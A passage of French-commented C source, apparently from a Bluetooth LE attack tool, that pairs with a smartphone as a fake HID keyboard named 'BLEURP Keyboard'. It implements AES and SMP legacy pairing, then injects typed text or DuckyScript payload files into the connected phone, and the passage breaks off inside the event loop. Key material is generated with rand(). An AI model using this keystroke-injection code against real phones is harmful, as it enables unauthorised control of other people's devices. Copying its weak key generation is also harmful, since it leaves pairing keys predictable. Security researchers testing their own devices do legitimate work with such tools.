    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
};

static void aes128_encrypt_block(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]) {
    static const uint32_t rcon[10] = {
        0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
        0x20000000, 0x40000000, 0x80000000, 0x1B000000, 0x36000000
    };
    uint32_t w[44];
    for (int i = 0; i < 4; i++) {
        w[i] = ((uint32_t)key[4*i] << 24) | ((uint32_t)key[4*i+1] << 16) |
               ((uint32_t)key[4*i+2] << 8) | (uint32_t)key[4*i+3];
    }
    for (int i = 4; i < 44; i++) {
        uint32_t temp = w[i - 1];
        if (i % 4 == 0) {
            uint32_t rot = (temp << 8) | (temp >> 24);
            temp = ((uint32_t)sbox[(rot >> 24) & 0xff] << 24) |
                   ((uint32_t)sbox[(rot >> 16) & 0xff] << 16) |
                   ((uint32_t)sbox[(rot >> 8) & 0xff] << 8) |
                   (uint32_t)sbox[rot & 0xff];
            temp ^= rcon[(i / 4) - 1];
        }
        w[i] = w[i - 4] ^ temp;
    }

    uint8_t state[4][4];
    for (int r = 0; r < 4; r++) {
        for (int c = 0; c < 4; c++) {
            state[r][c] = in[r + 4 * c] ^ (uint8_t)(w[c] >> (24 - 8 * r));
        }
    }

    for (int round = 1; round <= 10; round++) {
        for (int r = 0; r < 4; r++)
            for (int c = 0; c < 4; c++)
                state[r][c] = sbox[state[r][c]];

        uint8_t t;
        t = state[1][0]; state[1][0] = state[1][1]; state[1][1] = state[1][2]; state[1][2] = state[1][3]; state[1][3] = t;
        t = state[2][0]; state[2][0] = state[2][2]; state[2][2] = t;
        t = state[2][1]; state[2][1] = state[2][3]; state[2][3] = t;
        t = state[3][3]; state[3][3] = state[3][2]; state[3][2] = state[3][1]; state[3][1] = state[3][0]; state[3][0] = t;

        if (round < 10) {
            for (int c = 0; c < 4; c++) {
                uint8_t a0 = state[0][c], a1 = state[1][c], a2 = state[2][c], a3 = state[3][c];
                #define GMUL2(x) (((x) << 1) ^ (((x) & 0x80) ? 0x1b : 0x00))
                #define GMUL3(x) (GMUL2(x) ^ (x))
                state[0][c] = (uint8_t)(GMUL2(a0) ^ GMUL3(a1) ^ a2 ^ a3);
                state[1][c] = (uint8_t)(a0 ^ GMUL2(a1) ^ GMUL3(a2) ^ a3);
                state[2][c] = (uint8_t)(a0 ^ a1 ^ GMUL2(a2) ^ GMUL3(a3));
                state[3][c] = (uint8_t)(GMUL3(a0) ^ a1 ^ a2 ^ GMUL2(a3));
                #undef GMUL2
                #undef GMUL3
            }
        }

        for (int r = 0; r < 4; r++) {
            for (int c = 0; c < 4; c++) {
                state[r][c] ^= (uint8_t)(w[round * 4 + c] >> (24 - 8 * r));
            }
        }
    }

    for (int r = 0; r < 4; r++) {
        for (int c = 0; c < 4; c++) {
            out[r + 4 * c] = state[r][c];
        }
    }
}

// Fonction standard BLE e(key, plaintext) avec conversion Little-Endian <-> Big-Endian
static void smp_e(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]) {
    uint8_t key_be[16], in_be[16], out_be[16];
    for (int i = 0; i < 16; i++) {
        key_be[i] = key[15 - i];
        in_be[i] = in[15 - i];
    }
    aes128_encrypt_block(key_be, in_be, out_be);
    for (int i = 0; i < 16; i++) {
        out[i] = out_be[15 - i];
    }
}

// Fonction c1 standard SMP (Bluetooth Core Spec v5.4 Vol 3, Part H, Sec 2.2.3)
static void smp_c1(const uint8_t k[16], const uint8_t r[16],
                   const uint8_t pres[7], const uint8_t preq[7],
                   uint8_t iat, uint8_t rat,
                   const uint8_t ia[6], const uint8_t ra[6],
                   uint8_t out_c[16]) {
    uint8_t p1[16], p2[16];
    p1[0] = iat;
    p1[1] = rat;
    memcpy(&p1[2], preq, 7);
    memcpy(&p1[9], pres, 7);

    memcpy(&p2[0], ra, 6);
    memcpy(&p2[6], ia, 6);
    memset(&p2[12], 0, 4);

    uint8_t step1_in[16], step1_out[16], step2_in[16];
    for (int i = 0; i < 16; i++) step1_in[i] = r[i] ^ p1[i];
    smp_e(k, step1_in, step1_out);

    for (int i = 0; i < 16; i++) step2_in[i] = step1_out[i] ^ p2[i];
    smp_e(k, step2_in, out_c);
}

// Fonction s1 standard SMP pour dérivation du Short Term Key (STK)
// Bluetooth Core Spec v5.4 Vol 3, Part H, Sec 2.2.4:
// s1(k, r1, r2) = e(k, r') où r' = r1' || r2' (r1' = 64 LSB de r1, r2' = 64 LSB de r2)
// En rôle Périphérique (Responder): r1 = Srand, r2 = Mrand
// Concaténation Little-Endian: r'[0..7] = Mrand[0..7] et r'[8..15] = Srand[0..7]
static void smp_s1(const uint8_t k[16], const uint8_t mrand[16], const uint8_t srand[16], uint8_t out[16]) {
    uint8_t r_prime[16];
    memcpy(&r_prime[0], mrand, 8); // Bytes 0..7 = Mrand[0..7]
    memcpy(&r_prime[8], srand, 8); // Bytes 8..15 = Srand[0..7]
    smp_e(k, r_prime, out);
}

void smp_c1_calc(const uint8_t k[16], const uint8_t r[16],
                 const uint8_t pres[7], const uint8_t preq[7],
                 uint8_t iat, uint8_t rat,
                 const uint8_t ia[6], const uint8_t ra[6],
                 uint8_t out_c[16]) {
    smp_c1(k, r, pres, preq, iat, rat, ia, ra, out_c);
}

void smp_s1_calc(const uint8_t k[16], const uint8_t r1[16], const uint8_t r2[16], uint8_t out[16]) {
    smp_s1(k, r1, r2, out);
}

// Gestionnaire du protocole de sécurité SMP pour le rôle Périphérique (Slave)
int smp_server_handle_packet(uint16_t conn_handle,
                             const uint8_t *req, size_t req_len,
                             uint8_t *rsp, size_t rsp_max,
                             const struct peripheral_config *cfg,
                             struct peripheral_stats *stats) {
    (void)conn_handle;
    if (!req || req_len < 1 || !rsp || rsp_max < 7) return -1;

    uint8_t op = req[0];

    // 1. Réception d'un Pairing Request depuis le Smartphone (Central / Master)
    if (op == SMP_OP_PAIRING_REQ && req_len >= 7) {
        if (stats) stats->smp_requests_count++;

        memcpy(g_smp_session.preq, req, 7);

        uint8_t c_iocap   = req[1];
        uint8_t c_oob     = req[2];
        uint8_t c_auth    = req[3];
        uint8_t c_keysize = req[4];
        uint8_t c_init_kd = req[5];
        uint8_t c_resp_kd = req[6];

        bool c_mitm = (c_auth & 0x04) != 0;
        bool c_sc   = (c_auth & 0x08) != 0;
        bool c_bond = (c_auth & 0x01) != 0;

        printf("\n  %s[SMP REQ]%s Reçu Pairing Request du Smartphone :%s\n", UI_YELLOW, UI_BOLD, UI_RESET);
        printf("    IO Capability     : 0x%02x (%s)\n", c_iocap,
               c_iocap == 0x04 ? "KeyboardDisplay" :
               c_iocap == 0x01 ? "DisplayYesNo" :
               c_iocap == 0x02 ? "KeyboardOnly" :
               c_iocap == 0x03 ? "NoInputNoOutput" : "DisplayOnly");
        printf("    Données OOB       : 0x%02x\n", c_oob);
        printf("    AuthReq Smartphone: %s0x%02x%s [MITM=%s, SC=%s, Bonding=%s]\n",
               UI_PINK, c_auth, UI_RESET,
               c_mitm ? "OUI" : "NON", c_sc ? "OUI" : "NON", c_bond ? "OUI" : "NON");
        printf("    Max Key Size      : %d octets (%d bits)\n", c_keysize, c_keysize * 8);
        printf("    Key Dist (Init/Rsp): 0x%02x / 0x%02x\n", c_init_kd, c_resp_kd);

        // Construction du Pairing Response de notre périphérique Clavier
        uint8_t my_auth    = cfg ? cfg->auth_req : 0x01;      // Bonding par défaut
        uint8_t my_keysize = cfg ? cfg->max_key_size : 16;
        if (my_keysize == 0) my_keysize = 16;

        uint8_t my_iocap = 0x03; // NoInputNoOutput (Just Works) par défaut
        if (cfg && cfg->io_capability != 0) {
            my_iocap = cfg->io_capability;
        } else if ((my_auth & 0x04) != 0) {
            my_iocap = 0x02; // KeyboardOnly si MITM requis
        }

        uint8_t final_keysize = (c_keysize < my_keysize) ? c_keysize : my_keysize;
        if (final_keysize > 16) final_keysize = 16;
        if (final_keysize < 7)  final_keysize = 7;
        g_smp_session.negotiated_keysize = final_keysize;

        rsp[0] = SMP_OP_PAIRING_RSP;
        rsp[1] = my_iocap;
        rsp[2] = 0x00;        // No OOB
        rsp[3] = my_auth;     // Bonding / SC / MITM selon config
        rsp[4] = my_keysize;  // Key size
        rsp[5] = c_init_kd & 0x03; // Accepter LTK/IRK du Smartphone

        // Distribuer EncKey (LTK) si le Smartphone l'a demandé dans RespKeyDist
        // Android/iOS attend un LTK du Périphérique pour stocker le bonding
        uint8_t my_resp_kd = (c_resp_kd & 0x01);  // Bit 0 = EncKey (LTK)
        rsp[6] = my_resp_kd;
        g_smp_session.resp_key_dist = my_resp_kd;

        // Pré-générer le LTK que l'on distribuera en Phase 3 après encryption
        if (my_resp_kd & 0x01) {
            for (int i = 0; i < 16; i++)
                g_smp_session.ltk[i] = (uint8_t)(rand() & 0xff);
            if (g_smp_session.negotiated_keysize < 16) {
                memset(g_smp_session.ltk + g_smp_session.negotiated_keysize, 0,
                       16 - g_smp_session.negotiated_keysize);
            }
            g_smp_session.ediv = (uint16_t)(rand() & 0xffff);
            for (int i = 0; i < 8; i++)
                g_smp_session.rand_val[i] = (uint8_t)(rand() & 0xff);
            g_smp_session.phase3_pending = true;
        }

        memcpy(g_smp_session.pres, rsp, 7);

        printf("  %s[SMP RSP]%s Envoi Pairing Response Périphérique (AuthReq=0x%02x, KeySize=%d, IOCap=0x%02x, RespKD=0x%02x)...\n",
               UI_GREEN, UI_RESET, my_auth, my_keysize, my_iocap, my_resp_kd);

        if (stats) stats->smp_pairings_success++;
        return 7;
    }

    // 2. Réception du Pairing Confirm depuis le Smartphone
    if (op == SMP_OP_PAIRING_CONFIRM && req_len >= 17) {
        if (rsp_max < 17) return -1;
        printf("  %s[SMP]%s Reçu Pairing Confirm du Smartphone (16 octets)\n", UI_PURPLE, UI_RESET);
        memcpy(g_smp_session.c1, &req[1], 16);

        // Génération du nombre aléatoire r2 du Périphérique
        for (int i = 0; i < 16; i++) {
            g_smp_session.r2[i] = (uint8_t)(rand() & 0xff);
        }

        smp_c1(g_smp_session.tk, g_smp_session.r2,
               g_smp_session.pres, g_smp_session.preq,
               g_smp_session.iat, g_smp_session.rat,
               g_smp_session.ia, g_smp_session.ra,
               g_smp_session.c2);

        rsp[0] = SMP_OP_PAIRING_CONFIRM; // 0x03
        memcpy(&rsp[1], g_smp_session.c2, 16);
        printf("  %s[SMP RSP]%s Envoi Pairing Confirm Périphérique (16 octets)...\n", UI_GREEN, UI_RESET);
        return 17;
    }

    // 3. Réception du Pairing Random depuis le Smartphone
    if (op == SMP_OP_PAIRING_RANDOM && req_len >= 17) {
        if (rsp_max < 17) return -1;
        printf("  %s[SMP]%s Reçu Pairing Random du Smartphone (16 octets)\n", UI_PURPLE, UI_RESET);
        memcpy(g_smp_session.r1, &req[1], 16);

        // Vérification du Confirm envoyé par le Smartphone
        uint8_t check_c1[16];
        smp_c1(g_smp_session.tk, g_smp_session.r1,
               g_smp_session.pres, g_smp_session.preq,
               g_smp_session.iat, g_smp_session.rat,
               g_smp_session.ia, g_smp_session.ra,
               check_c1);

        if (memcmp(check_c1, g_smp_session.c1, 16) != 0) {
            printf("  %s[SMP FAIL]%s Échec vérification Confirm Smartphone (c1 mismatch) !\n", UI_RED, UI_RESET);
            rsp[0] = SMP_OP_PAIRING_FAILED;
            rsp[1] = 0x04; // Confirm Value Failed
            return 2;
        }

        // Calcul et mémorisation du STK (Short Term Key) pour le chiffrement Link Layer
        smp_s1(g_smp_session.tk, g_smp_session.r1, g_smp_session.r2, g_smp_session.stk);
        if (g_smp_session.negotiated_keysize < 16) {
            memset(g_smp_session.stk + g_smp_session.negotiated_keysize, 0, 16 - g_smp_session.negotiated_keysize);
        }
        g_smp_session.stk_ready = true;

        rsp[0] = SMP_OP_PAIRING_RANDOM; // 0x04
        memcpy(&rsp[1], g_smp_session.r2, 16);
        printf("  %s[SMP RSP]%s Envoi Pairing Random Périphérique (16 octets)...\n", UI_GREEN, UI_RESET);
        printf("  %s%s[+] Handshake d'appairage SMP validé avec succès (STK généré) !%s\n> ", UI_GREEN, UI_BOLD, UI_RESET);
        fflush(stdout);
        return 17;
    }

    // 4. Réception des clés de distribution Phase 3 envoyées par le smartphone (unidirectionnelles)
    if (op == 0x06 || op == 0x07 || op == 0x0a) {
        return 0; // Pas de réponse ATT/SMP requise
    }

    if (op == 0x08 && req_len >= 17) {
        printf("  %s[SMP]%s Reçu Identity Info (IRK du smartphone)\n", UI_PURPLE, UI_RESET);
        return 0;
    }

    if (op == 0x09 && req_len >= 8) {
        printf("  %s[SMP]%s Reçu Identity Address Info du smartphone\n", UI_PURPLE, UI_RESET);
        return 0;
    }

    if (op == SMP_OP_PUBLIC_KEY) {
        printf("  %s[SMP]%s Reçu Secure Connections ECDH Public Key (64 octets)\n", UI_PURPLE, UI_RESET);
        return 0;
    }

    if (op == SMP_OP_PAIRING_FAILED && req_len >= 2) {
        uint8_t rcode = req[1];
        printf("  %s[SMP FAIL]%s Le smartphone a rejeté l'appairage : Code 0x%02x (%s)\n",
               UI_RED, UI_RESET, rcode, smp_fail_reason_str(rcode));
        return 0;
    }

    return 0;
}

// Distribution des clés Phase 3 du Périphérique (Responder) après activation du chiffrement
// Envoie Encryption Information (0x06) + Master Identification (0x07) pour que le smartphone
// puisse stocker le bonding et reconnecter automatiquement
static void smp_distribute_keys_phase3(int fd, uint16_t conn_handle) {
    if (!g_smp_session.phase3_pending) return;
    if (!(g_smp_session.resp_key_dist & 0x01)) return; // EncKey non demandé

    // 1. Encryption Information (SMP opcode 0x06) : contient le LTK (16 octets)
    uint8_t enc_info[17];
    enc_info[0] = 0x06; // SMP_OP_ENCRYPTION_INFO
    memcpy(&enc_info[1], g_smp_session.ltk, 16);
    send_l2cap_packet(fd, conn_handle, SMP_CID_VAL, enc_info, 17);
    printf("  %s[SMP Phase3]%s Envoi Encryption Info (LTK du périphérique, 16 octets)\n", UI_GREEN, UI_RESET);
    usleep(10000); // Petit délai entre les deux PDUs

    // 2. Master Identification (SMP opcode 0x07) : contient EDIV (2) + Rand (8)
    uint8_t master_id[11];
    master_id[0] = 0x07; // SMP_OP_MASTER_IDENT
    master_id[1] = (uint8_t)(g_smp_session.ediv & 0xff);
    master_id[2] = (uint8_t)(g_smp_session.ediv >> 8);
    memcpy(&master_id[3], g_smp_session.rand_val, 8);
    send_l2cap_packet(fd, conn_handle, SMP_CID_VAL, master_id, 11);
    printf("  %s[SMP Phase3]%s Envoi Master Identification (EDIV=0x%04x)\n", UI_GREEN, UI_RESET, g_smp_session.ediv);

    g_smp_session.phase3_pending = false;
    printf("  %s%s[+] Distribution de clés Phase 3 terminée — bonding établi !%s\n> ",
           UI_GREEN, UI_BOLD, UI_RESET);
    fflush(stdout);
}

// Envoi d'un rapport HID clavier (Input Report) via notification ATT sur le Handle 0x0018
int peripheral_send_hid_report(int fd, uint16_t conn_handle, uint8_t modifiers, const uint8_t keys[6]) {
    uint8_t ntf[11];
    ntf[0] = ATT_OP_HANDLE_VAL_NTF; // 0x1B
    ntf[1] = (uint8_t)(GATT_HANDLE_INPUT_REP_VAL & 0xff); // 0x18
    ntf[2] = (uint8_t)(GATT_HANDLE_INPUT_REP_VAL >> 8);   // 0x00

    ntf[3] = modifiers;
    ntf[4] = 0x00; // Reserved
    if (keys) {
        memcpy(&ntf[5], keys, 6);
    } else {
        memset(&ntf[5], 0, 6);
    }

    return send_l2cap_packet(fd, conn_handle, ATT_CID_VAL, ntf, sizeof(ntf));
}

// Envoi d'une frappe de touche (appui + relâchement)
int peripheral_send_keystroke(int fd, uint16_t conn_handle, uint8_t modifier, uint8_t keycode) {
    uint8_t keys[6] = { keycode, 0, 0, 0, 0, 0 };
    if (peripheral_send_hid_report(fd, conn_handle, modifier, keys) < 0) return -1;
    usleep(15000); // 15ms maintien touche

    memset(keys, 0, sizeof(keys));
    if (peripheral_send_hid_report(fd, conn_handle, 0, keys) < 0) return -1;
    usleep(10000); // 10ms relâchement

    return 0;
}

// Envoi d'une chaîne de texte ASCII convertie en frappes HID
int peripheral_send_text(int fd, uint16_t conn_handle, const char *text) {
    if (!text) return 0;
    int count = 0;
    for (const char *p = text; *p; p++) {
        uint8_t mods = 0, key = 0;
        if (keymap_ascii(*p, &mods, &key)) {
            if (peripheral_send_keystroke(fd, conn_handle, mods, key) == 0) {
                count++;
            }
        }
    }
    return count;
}

// Sink pour l'interpréteur DuckyScript
struct ducky_ble_ctx {
    int fd;
    uint16_t conn_handle;
};

static int ducky_ble_sink(void *ctx, ducky_ev_t ev, uint32_t a, uint32_t b) {
    struct ducky_ble_ctx *c = ctx;
    if (ev == DUCKY_DELAY) {
        usleep((useconds_t)a * 1000);
        return 0;
    }
    return peripheral_send_keystroke(c->fd, c->conn_handle, (uint8_t)a, (uint8_t)b);
}

// Exécution de la boucle principale du serveur Périphérique Clavier BLE
int peripheral_keyboard_run(const struct peripheral_config *cfg) {
    int dev_id = cfg ? cfg->dev_id : 0;
    
    // Auto-détection de l'adaptateur si dev_id == 0 et que hci0 n'existe pas
    char hpath[64];
    snprintf(hpath, sizeof(hpath), "/sys/class/bluetooth/hci%d", dev_id);
    if (access(hpath, F_OK) != 0) {
        int def = bleurp_hci_find_default_dev();
        printf("  [*] Adaptateur hci%d introuvable, bascule automatique sur hci%d\n", dev_id, def);
        dev_id = def;
    }

    const char *dev_name = (cfg && cfg->device_name) ? cfg->device_name : "BLEURP Keyboard";

    printf("\n  %s[*] Initialisation du mode Périphérique Clavier BLE sur hci%d...%s\n", UI_PINK, dev_id, UI_RESET);

    // 1. Mise en sommeil de l'adaptateur via BlueZ mgmt pour ouvrir HCI_CHANNEL_USER
    set_adapter_power_mgmt(dev_id, 0);
    usleep(50000);

    int fd = socket(AF_BLUETOOTH_VAL, SOCK_RAW, BTPROTO_HCI_VAL);
    if (fd < 0) {
        set_adapter_power_mgmt(dev_id, 1);
        perror("  [!] socket(BTPROTO_HCI)");
        return -1;
    }

    struct sockaddr_hci_raw sa;
    memset(&sa, 0, sizeof(sa));
    sa.hci_family = AF_BLUETOOTH_VAL;
    sa.hci_dev = (uint16_t)dev_id;
    sa.hci_channel = HCI_CHANNEL_USER_VAL;

    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        int err = errno;
        close(fd);
        set_adapter_power_mgmt(dev_id, 1);
        fprintf(stderr, "  [!] Échec bind(HCI_CHANNEL_USER) sur hci%d: %s (code %d)\n", dev_id, strerror(err), err);
        return -1;
    }

    // 2. Initialisation contrôleur (HCI Reset)
    uint8_t st = 0;
    hci_send_cmd_sync(fd, 0x0c03, NULL, 0, &st);
    usleep(50000);

    // Lecture de l'adresse MAC réelle de notre contrôleur local (HCI_Read_BD_ADDR)
    memset(g_local_bdaddr, 0, sizeof(g_local_bdaddr));
    if (hci_read_local_bdaddr(fd, g_local_bdaddr) == 0) {
        printf("  [+] Contrôleur local BD_ADDR : %02X:%02X:%02X:%02X:%02X:%02X\n",
               g_local_bdaddr[5], g_local_bdaddr[4], g_local_bdaddr[3],
               g_local_bdaddr[2], g_local_bdaddr[1], g_local_bdaddr[0]);
    } else {
        printf("  [!] Impossible de lire BD_ADDR du contrôleur, utilisation de l'adresse par défaut\n");
    }

    // 3. Masques d'événements
    uint8_t evt_mask[8] = {0xff, 0xff, 0xfb, 0xff, 0x07, 0xf8, 0xbf, 0x3d};
    hci_send_cmd_sync(fd, 0x0c01, evt_mask, 8, &st); // Set Event Mask

    uint8_t le_mask[8] = {0xff, 0x1f, 0x0a, 0x03, 0, 0, 0, 0};
    hci_send_cmd_sync(fd, 0x2001, le_mask, 8, &st); // LE Set Event Mask

    // 4. Désactiver les annonces avant de configurer les paramètres
    uint8_t adv_off = 0x00;
    hci_send_cmd_sync(fd, 0x200a, &adv_off, 1, &st);

    // 5. Configuration des paramètres d'annonces (ADV_IND, Connectable, intervalle 20-30ms recommandé par Apple)
    uint8_t adv_param[15];
    memset(adv_param, 0, sizeof(adv_param));
    adv_param[0] = 0x20; adv_param[1] = 0x00; // Min Interval (20ms)
    adv_param[2] = 0x30; adv_param[3] = 0x00; // Max Interval (30ms)
    adv_param[4] = 0x00;                      // ADV_IND (Connectable Undirected)
    adv_param[5] = 0x00;                      // Own addr: Public
    adv_param[6] = 0x00;                      // Peer addr: Public
    // adv_param[7..12] = 0 (Peer addr)
    adv_param[13] = 0x07;                     // Channels 37, 38, 39
    adv_param[14] = 0x00;                     // Filter Policy: Process all
    if (hci_send_cmd_sync(fd, 0x2006, adv_param, 15, &st) < 0) {
        fprintf(stderr, "  [!] Avertissement : HCI_LE_Set_Advertising_Parameters retour 0x%02x\n", st);
    }

    // 6. Données d'annonces (Advertising Data)
    uint8_t adv_raw[32];
    memset(adv_raw, 0, sizeof(adv_raw));
    int adv_len = peripheral_build_adv_data(dev_name, &adv_raw[1], 31);
    if (adv_len > 0) {
        adv_raw[0] = (uint8_t)adv_len;
        if (hci_send_cmd_sync(fd, 0x2008, adv_raw, 32, &st) < 0) {
            fprintf(stderr, "  [!] Avertissement : HCI_LE_Set_Advertising_Data retour 0x%02x\n", st);
        }
    }

    // 7. Données de réponse au scan (Scan Response Data)
    uint8_t scan_raw[32];
    memset(scan_raw, 0, sizeof(scan_raw));
    int scan_len = peripheral_build_scan_rsp(dev_name, &scan_raw[1], 31);
    if (scan_len > 0) {
        scan_raw[0] = (uint8_t)scan_len;
        if (hci_send_cmd_sync(fd, 0x2009, scan_raw, 32, &st) < 0) {
            fprintf(stderr, "  [!] Avertissement : HCI_LE_Set_Scan_Response_Data retour 0x%02x\n", st);
        }
    }

    // 8. Démarrage effectif de l'émission d'annonces
    uint8_t adv_enable = 0x01;
    if (hci_send_cmd_sync(fd, 0x200a, &adv_enable, 1, &st) < 0) {
        fprintf(stderr, "  [!] Avertissement : HCI_LE_Set_Advertise_Enable retour 0x%02x\n", st);
    }

    printf("\n  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %s%s[+] Périphérique Clavier BLE actif : « %s »%s\n", UI_GREEN, UI_BOLD, dev_name, UI_RESET);
    printf("  %s============================================================%s\n", UI_PURPLE, UI_RESET);
    printf("  %sInstructions pour le test :%s\n", UI_YELLOW, UI_RESET);
    printf("  1. Sur votre smartphone (iPhone ou Android), ouvrez : %sRéglages > Bluetooth%s\n", UI_PINK, UI_RESET);
    printf("  2. Repérez l'appareil nommé %s« %s »%s et touchez pour vous connecter.\n", UI_PINK, dev_name, UI_RESET);
    printf("  3. Acceptez la demande de jumelage à l'écran du smartphone.\n");
    printf("  %s(Appuyez sur [Ctrl-C] ou tapez [q] pour quitter)%s\n\n", UI_PURPLE, UI_RESET);

    struct peripheral_stats stats;
    memset(&stats, 0, sizeof(stats));

    uint16_t active_conn_handle = 0;
    bool is_connected = false;

    // Boucle d'événements
    while (1) {
        struct pollfd fds[2];
        fds[0].fd = fd;
        fds[0].events = POLLIN;
        fds[0].revents = 0;

        fds[1].fd = STDIN_FILENO;
        fds[1].events = POLLIN;
        fds[1].revents = 0;

        int ret = poll(fds, 2, 200);
        if (ret < 0) {
            if (errno == EINTR) break;
            break;
        }

        // Entrée utilisateur depuis le terminal
        if (fds[1].revents & POLLIN) {
            char line[256];
            if (fgets(line, sizeof(line), stdin)) {
                if (line[0] == 'q' || line[0] == 'Q') {
                    break;
                }
                if (is_connected) {
                    // Supprimer le \n final pour l'envoi de texte
                    size_t slen = strlen(line);
                    if (slen > 0 && line[slen - 1] == '\n') line[slen - 1] = '\0';

                    if (line[0] == '/' && line[1] == 'd') {
                        // Commande Ducky: /d <fichier>
                        const char *pfile = line + 2;
                        while (*pfile == ' ') pfile++;
                        if (*pfile == '\0') pfile = "src/send_attack/payloads/hello.ducky";
                        FILE *fp = fopen(pfile, "r");
                        if (fp) {
                            printf("  [*] Exécution du DuckyScript '%s' vers le smartphone...\n", pfile);
                            struct ducky_ble_ctx dctx = { .fd = fd, .conn_handle = active_conn_handle };
                            ducky_run(fp, ducky_ble_sink, &dctx);
                            fclose(fp);
                            printf("  %s[+] Payload envoyé avec succès !%s\n", UI_GREEN, UI_RESET);
                        } else {
                            printf("  [-] Fichier payload introuvable : %s\n", pfile);
                        }
                    } else if (strlen(line) > 0) {
                        printf("  [*] Injection du texte vers le smartphone : « %s »\n", line);
                        peripheral_send_text(fd, active_conn_handle, line);
                        // Ajout d'un saut de ligne (Enter)
                        uint8_t enter_mod = 0, enter_key = 0x28;
                        peripheral_send_keystroke(fd, active_conn_handle, enter_mod, enter_key);
                    }
                } else {
                    printf("  %s[!] En attente de connexion du smartphone...%s\n", UI_YELLOW, UI_RESET);
                }
            }
        }

        // Événements et paquets HCI
        if (fds[0].revents & POLLIN) {
            uint8_t buf[1024];
            ssize_t n = read(fd, buf, sizeof(buf));
            if (n < 2) continue;

            uint8_t pkt_type = buf[0];

            // 1. Événements de contrôle HCI (Connexion / Déconnexion / Chiffrement)
            if (pkt_type == HCI_EVENT_PKT && n >= 3) {
                uint8_t evt_code = buf[1];
                if (evt_code == HCI_EV_LE_META && n >= 4) {
                    uint8_t sub = buf[3];
                    if (sub == HCI_LE_EV_CONN_COMPL || sub == HCI_LE_EV_ENHANCED_CONN) {
                        if (buf[4] == 0x00) { // Success
                            active_conn_handle = (uint16_t)(buf[5] | (buf[6] << 8));
                            is_connected = true;
                            stats.connections_count++;

                            uint8_t role = buf[7]; // 0x01 = Slave/Peripheral
                            uint8_t peer_type = buf[8];
                            const uint8_t *paddr = &buf[9];
                            stats.peer_addr_type = peer_type;
                            snprintf(stats.peer_addr_str, sizeof(stats.peer_addr_str),
                                     "%02X:%02X:%02X:%02X:%02X:%02X",
                                     paddr[5], paddr[4], paddr[3], paddr[2], paddr[1], paddr[0]);

                            // Initialisation de la session SMP pour le smartphone connecté
                            memset(&g_smp_session, 0, sizeof(g_smp_session));
                            g_smp_session.iat = (peer_type & 0x01);
                            memcpy(g_smp_session.ia, paddr, 6);
                            g_smp_session.rat = 0x00; // Public pour notre contrôleur
                            memcpy(g_smp_session.ra, g_local_bdaddr, 6);
                            g_smp_session.active = true;

                            printf("\n  %s============================================================%s\n", UI_GREEN, UI_RESET);
                            printf("  %s%s[+] Smartphone connecté !%s (Handle = 0x%04x, Rôle = %s)\n",
                                   UI_GREEN, UI_BOLD, UI_RESET, active_conn_handle, role == 0x01 ? "Slave/Périphérique" : "Master");
                            printf("      Adresse Cible  : %s%s%s [%s]\n",
                                   UI_YELLOW, stats.peer_addr_str, UI_RESET, (peer_type & 0x01) ? "Random RPA" : "Public");
                            printf("  %s============================================================%s\n", UI_GREEN, UI_RESET);

                            // Envoi optionnel du Security Request (0x0B) pour solliciter l'appairage
                            if (cfg && cfg->trigger_sec_req) {
                                uint8_t sec_req[2] = { SMP_OP_SECURITY_REQ, cfg->auth_req };
                                send_l2cap_packet(fd, active_conn_handle, SMP_CID_VAL, sec_req, 2);
                                printf("  [*] Envoi SMP Security Request (AuthReq=0x%02x) au smartphone...\n", cfg->auth_req);
                            }

